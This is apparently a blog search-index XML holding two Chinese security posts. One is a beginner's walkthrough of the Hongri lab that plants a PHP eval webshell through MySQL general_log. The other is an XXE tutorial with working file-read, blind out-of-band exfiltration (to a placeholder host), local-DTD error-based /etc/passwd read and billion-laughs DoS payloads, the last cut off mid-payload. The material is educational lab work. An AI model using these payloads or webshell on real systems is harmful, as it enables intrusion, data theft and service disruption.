<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/03/30/chuZ%E8%8F%9C%E9%B8%9F%E6%97%A5%E8%AE%B0/"/>
    <url>/2024/03/30/chuZ%E8%8F%9C%E9%B8%9F%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>欢迎来看一个叫chuZ的小菜鸟成长日记<img src="https://dl4.weshineapp.com/gif/20200807/86259d4919e59ed9f7f085b47a5d997f.gif?f=micro_" alt="img"></p><p>第一个学习目标：红日靶场！！！(●’◡’●)</p><h1 id="红日靶场1"><a href="#红日靶场1" class="headerlink" title="红日靶场1"></a>红日靶场1</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这一步过程网上已经很多了，就不再赘述，主体是下载以及配置网络</p><h2 id="开始前准备"><a href="#开始前准备" class="headerlink" title="开始前准备"></a>开始前准备</h2><h3 id="1-开启网络服务"><a href="#1-开启网络服务" class="headerlink" title="1.开启网络服务"></a>1.开启网络服务</h3><p>打开win7靶机后在其目录下找到<strong>phpstudy</strong>,开启其网络服务,使用命令win+r打开命令行,输入指令</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span><br></code></pre></td></tr></table></figure><p>来获得其ip地址<img src="F:\YL渗透日记\红日截图保留处\QQ截图20240326170826.png"></p><h3 id="2-进行外围打点"><a href="#2-进行外围打点" class="headerlink" title="2.进行外围打点"></a>2.进行外围打点</h3><p>在获得其ip地址后，我们打开攻击机，这里使用的是kali和主机混合,使用kali自带的浏览器打开win7的IP地址<img src="F:\YL渗透日记\红日截图保留处\QQ截图20240326170954.png"></p><p>如图所见我们可以看到win7主机开启了phpstudy探针,同时呈现了日志输出目录以及其打开的80端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">补充知识点:在已知存在php探针以及数据库连接时,我们可以尝试访问其/phpMyadmin页面，大概率存在<br></code></pre></td></tr></table></figure><h4 id="2-1第一关-MySQL数据库"><a href="#2-1第一关-MySQL数据库" class="headerlink" title="2.1第一关-MySQL数据库"></a>2.1第一关-MySQL数据库</h4><p>访问&#x2F;phpMyadmin后是一个MySQL数据库的登录页面</p><p><img src="F:\YL渗透日记\红日截图保留处\QQ截图20240326171024.png"></p><p>对于这种登录界面,我们有很多种方式进行登陆,但是本次遇到的属于弱密码,简单尝试即可进入(不懂就问:这真的能防住人吗ヾ(•ω•&#96;)o )进入后可以看见是一个是一个MySQL数据库<img src="F:\YL渗透日记\红日截图保留处\QQ截图20240326220222.png"></p><p>首先进入phpmyadmin想到可以使用into_outfile的方式上传shell，因此要查看是否具有权限，使用命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SHOW</span> <span class="hljs-keyword">GLOBAL</span> VARIBLES <span class="hljs-keyword">LIKE</span> &quot;%secure&quot; 查看是否具有权限来上传shell<br></code></pre></td></tr></table></figure><p><img src="F:\YL渗透日记\红日截图保留处\202203271743187.png"></p><p>可以看见现在是没有权限进行这一步操作的</p><p>那我们只能使用别的方法来尝试上传shell，MySQL数据库有一个日志文件，这是总所周知的东西，那我们为啥不直接使用<strong>日志</strong>来输出shell呢，首先查看我们是否具有输出日志的权限</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">SET GLOBAL general_log = ON;//将日志打开</span><br><span class="language-xml">SET GLOBAL general_log_file = &#x27;C:/phpstudy/WWW/YL.php&#x27;;//改变日志的路径，让我们能找到准备变成木马的“日志”</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span> (<span class="hljs-variable">$_POST</span>[hack]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;//查找这个代码，查询情况写入日志，上马不一定要上传，这也是一个新的思路以及方向</span><br></code></pre></td></tr></table></figure><p><img src="F:\YL渗透日记\红日截图保留处\QQ截图20240326221416.png"></p><p>可以看见我们成功上马了，蚁剑连接的密码为hack</p><p><img src="F:\YL渗透日记\红日截图保留处\QQ截图20240326221940.png"></p><p>连接成功！第一关通关！！！(●’◡’●)</p><h3 id="3-开始后渗透"><a href="#3-开始后渗透" class="headerlink" title="3.开始后渗透"></a>3.开始后渗透</h3>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/03/30/XML%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/03/30/XML%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="xml注入-XXE攻击"><a href="#xml注入-XXE攻击" class="headerlink" title="xml注入(XXE攻击)"></a>xml注入(XXE攻击)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>了解什么是xml</p><p><strong>XML</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">简单了解XML：<br><br><span class="hljs-keyword">XML</span> <span class="hljs-title">指可扩展标记语言（EXtensible</span> Markup Language）<br><span class="hljs-keyword">XML</span> <span class="hljs-title">是一种标记语言，很类似 HTML</span><br><span class="hljs-keyword">XML</span> <span class="hljs-title">被设计为传输和存储数据，其焦点是数据的内容 XML</span> 被设计用来结构化、存储以及传输信息<br><span class="hljs-keyword">XML</span> <span class="hljs-title">允许创作者定义自己的标签和自己的文档结构</span><br><span class="hljs-title">语法：</span><br><span class="hljs-title"></span><br><span class="hljs-title">XML</span>元素都必须有关闭标签。<br><span class="hljs-keyword">XML</span> <span class="hljs-title">标签对大小写敏感。</span><br><span class="hljs-title">XML</span> 必须正确地嵌套。<br><span class="hljs-keyword">XML</span> <span class="hljs-title">文档必须有根元素。</span><br><span class="hljs-title">XML</span> 的属性值须加引号。<br>结构：<br><br><span class="hljs-keyword">XML</span> <span class="hljs-title">文档声明，在文档的第一行</span><br><span class="hljs-title">XML</span> 文档类型定义，即DTD，XXE 漏洞所在的地方<br><span class="hljs-keyword">XML</span> <span class="hljs-title">文档元素</span><br></code></pre></td></tr></table></figure><p>xml的实体引用</p><p><img src="F:\YL渗透日记\红日截图保留处\a0a2dd5c875847a7852e4d66b93723bc.png"></p><p>DTD<br>文档类型定义（DTD）：可以合法的XML文档构建模块，可以被声明在XML的文档中，也可以作为一个外部的引用。这里也就是XXE存在的地方。</p><p>DTD文档的三种格式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml">1.内部DTD文档<br><span class="hljs-meta">&lt;!DOCTYPE 根元素[定义内容]&gt;</span><br> <br>2.外部DTD文档<br><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;DTD文件路径&quot;</span>&gt;</span><br> <br>3.内外部DTD文档结合<br><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;DTD文件路径&quot;</span> [定义内容]&gt;</span><br></code></pre></td></tr></table></figure><h4 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h4><p>内部实体几乎没有什么利用价值</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-string">&quot;实体的值&quot;</span>&gt;</span><br> <br>例如：<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-string">&quot;hello&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h4><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml">有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，</span><br><span class="language-xml">外部实体的引用可以利用如下协议</span><br><span class="language-xml">file:///path/to/file.ext</span><br><span class="language-xml">http://url/file.ext</span><br><span class="language-xml">php://filter/read=convert.base64-encode/resource=conf.php  //php伪协议</span><br><span class="language-xml"> </span><br><span class="language-xml"> </span><br><span class="language-xml">例如:</span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY  % <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://xxx.xxx.xxx/evil.dtd&quot;</span> &gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%xxe;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;evil;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span></span><br><span class="language-xml"> </span><br><span class="language-xml">外部evil.dtd中的内容</span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">evil</span> <span class="hljs-keyword">SYSTEM</span> “file:///d:/1.txt” &gt;</span></span><br></code></pre></td></tr></table></figure><p>%xxe执行后会加载外部实体 evil.dtd 并执行，得到的结果会放在<foo></foo>中。</p><h2 id="1-1-什么是XXE攻击"><a href="#1-1-什么是XXE攻击" class="headerlink" title="1.1 什么是XXE攻击"></a>1.1 什么是XXE攻击</h2><p>​        XXE攻击是指xml外部实体攻击漏洞。XML外部实体攻击是针对解析XML输入的应用程序的一种攻击。当包含对外部实体的引用的XML输入被弱配置XML解析器处理时，就会发生这种攻击。这种攻击通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p><h2 id="1-2-XXE攻击原理"><a href="#1-2-XXE攻击原理" class="headerlink" title="1.2 XXE攻击原理"></a>1.2 XXE攻击原理</h2><p>　　攻击者通过向服务器注入指定的XML实体内容，从而让服务器按照指定的配置进行执行，导致问题。也就是说服务端接收和解析了来自用户端的XML数据，而又没有做严格的安全控制，从而导致XML外部实体注入，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。XXE漏洞触发的点往往是可以上传XML文件的位置，没有对上传的XML文件进行过滤，导致可上传恶意XML文件。&lt;服务器接受xml文件但不经过过滤或者过滤不完全,就会导致类似SQL的攻击实现&gt;</p><h2 id="1-3-XXE漏洞利用"><a href="#1-3-XXE漏洞利用" class="headerlink" title="1.3 XXE漏洞利用"></a>1.3 XXE漏洞利用</h2><h3 id="1-3-1-文件读取"><a href="#1-3-1-文件读取" class="headerlink" title="1.3.1 文件读取"></a>1.3.1 文件读取</h3><p>​       分为<strong>有回显</strong>以及<strong>无回显</strong></p><p>​       有回显的情况可以直接在页面中看到payload的执行结果或现象，无回显的情况又称为 blind xxe（类似于布尔盲注、时间盲注），可以使用外带数据(OOB)通道提取数据</p><h4 id="1-3-1-1-有回显"><a href="#1-3-1-1-有回显" class="headerlink" title="1.3.1.1 有回显"></a>1.3.1.1 有回显</h4><p><strong>有回显测试源码</strong>如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xml</span>=<span class="hljs-title function_ invoke__">simplexml_load_string</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xml&#x27;</span>]);<br><span class="hljs-title function_ invoke__">print_r</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$xml</span>);<span class="hljs-comment">//有回显</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">定义一个名为<span class="hljs-built_in">xml</span>的变量,通过simplexml_load_string()函数将接收到的GET请求传参解析成一个SimpleXMLElement对象,再通过<span class="hljs-built_in">string</span>函数将其转化为字符串,并将其打印出来<br></code></pre></td></tr></table></figure><p>此处回显即为打印出来的GET方式传参变量”xml”</p><p>此时的<strong>payload</strong>如下:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///D://1.txt&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xquery">第一行为固定的头,不再赘述<br>第二行申明一个根元<span class="hljs-built_in">素root</span>,并使用外部实体<span class="hljs-string">&quot;SYSTEM&quot;</span>引入一个来自本地计算机的文件<span class="hljs-string">&quot;1.txt&quot;</span><br>第三行作用为将file的值插入<span class="hljs-built_in">到root</span>中,即输出<span class="hljs-string">&quot;1.txt&quot;</span><br>总的来说就是将payload作为GET传参的参数<span class="hljs-string">&quot;xml&quot;</span>,从而实现代码目的，输出<span class="hljs-string">&quot;1.txt&quot;</span>,实现远程文件的读取<br></code></pre></td></tr></table></figure><h4 id="1-3-1-2-无回显-加载远程DTD"><a href="#1-3-1-2-无回显-加载远程DTD" class="headerlink" title="1.3.1.2 无回显 加载远程DTD"></a>1.3.1.2 无回显 加载远程DTD</h4><p>​     无回显的文件读取可以通过<strong>blind XXE</strong>方法(类似SQL盲注理解)加上外带数据通道（ooB）来提取数据</p><p>先使用<strong>php:&#x2F;&#x2F;filter</strong>(php伪协议)获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器来读取数据。</p><p>虽然<strong>无法直接查看文件</strong>内容，但我们仍然可以使用<strong>易受攻击的服务器</strong>作为代理，在<strong>外部网络</strong>上执行扫描以及代码。</p><p>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=D:/1.txt&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://xxx.xxx.xxx.xxx/evil.xml&quot;</span>&gt;</span></span><br><span class="hljs-meta">%dtd;</span><br><span class="hljs-meta">%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>又evil.xml文件代码如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">payload</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx.xxx.xxx.xxx/?content=%file;&#x27;&gt;&quot;</span>&gt;</span> %payload;<br>//%号要进行实体编码成&amp;#x25<br></code></pre></td></tr></table></figure><p>解析如下:</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">先使用<span class="hljs-built_in">%dtd</span>请求到外部实体evil.xml,且由evil.xml代码可知,<span class="hljs-built_in">%payload</span>调用了<span class="hljs-built_in">%file</span>,由<span class="hljs-built_in">%file</span>获取对方主机上的敏感文件<span class="hljs-number">1.</span>txt,将<span class="hljs-built_in">%file</span>替换为<span class="hljs-built_in">%send</span>,将文件<span class="hljs-number">1.</span>txt发送到外部主机上,实现文件的远程读取<br></code></pre></td></tr></table></figure><p>有两个常见的模版可以参考</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///c://test/1.txt&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://localhost:88/evil.xml&quot;</span>&gt;</span> </span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%dtd; %all; </span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-symbol">&amp;send;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml"> </span><br><span class="language-xml">evil.xml文件内容为</span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:88%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://localhost:88/evil.xml&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%dtd;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%send;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml"> </span><br><span class="language-xml">evil.xml文件内容为：</span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">payload</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://localhost:88/?content=%file;&#x27;&gt;&quot;</span>&gt;</span> %payload;</span><br></code></pre></td></tr></table></figure><p>理解同上面的代码解析，在此处不再赘述</p><h4 id="1-3-1-3-无回显-加载本地DTD"><a href="#1-3-1-3-无回显-加载本地DTD" class="headerlink" title="1.3.1.3 无回显 加载本地DTD"></a>1.3.1.3 无回显 加载本地DTD</h4><p>​如果目标有防火墙等设备，<strong>阻止了对外连接</strong>，可以采用<strong>基于错误回显</strong>的XXE。这种方式最流行的一种就是加载<strong>本地</strong>的DTD文件。</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">messege</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///opt/IBM/Websphere/AppServer/properties/sip-app10.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span><span class="hljs-string">&#x27;aaa)&gt;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">    &lt;!ENTITY &amp;#x25;file SYSTEM &quot;file:///etc/passwd&quot;&gt;SYSTEM &amp;#x27;&lt;!ENTITY &amp;#x25; eval &quot; </span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">    &lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">    &amp;#x25;eval;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">    &amp;#x25;error;</span></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta"><span class="language-xml">    &lt;!ENTITY aa (bb&#x27;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">  %local_dtd;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>any text<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></span><br><span class="language-xml"> </span><br></code></pre></td></tr></table></figure><p>​      此处eval可以作为我们的突破口来进行xml注入攻击</p><p>​      附上:&#x2F;opt&#x2F;IBM&#x2F;Websphere&#x2F;AppServer&#x2F;properties&#x2F;sip-app10.dtd 是websphere上默认存在的dtd，可以通过加载它触发报错返回读取文件的内容。</p><h3 id="1-3-2-Dos攻击"><a href="#1-3-2-Dos攻击" class="headerlink" title="1.3.2 Dos攻击"></a>1.3.2 Dos攻击</h3><p>常见的XML炸弹，由于DTD的定义级数展开,当XML解释器尝试解析时,这个很小的文件就会膨胀到3G,以实现Dos攻击</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-params">&lt;?xml version=&quot;<span class="hljs-number">1.0</span>&quot;?&gt;</span><br><span class="hljs-params">&lt;!DOCTYPE lolz [</span><br><span class="hljs-params">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="hljs-params">&lt;!ENTITY lol2 &quot;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;&quot;&gt;</span><br><span class="hljs-params">&lt;!ENTITY lol3 &quot;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;&quot;&gt;</span><br><span class="hljs-params">&lt;!ENTITY lol4 &quot;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;<span class="hljs-variable">&amp;lol3</span>;&quot;&gt;</span><br><span class="hljs-params">&lt;!ENTITY lol5 &quot;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;<span class="hljs-variable">&amp;lol4</span>;&quot;&gt;</span><br><span class="hljs-params">&lt;!ENTITY lol6 &quot;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;<span class="hljs-variable">&amp;lol5</span>;&quot;&gt;</span><br><span class="hljs-params">&lt;!ENTITY lol7 &quot;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span class="hljs-variable">&amp;lol6</span>;<span 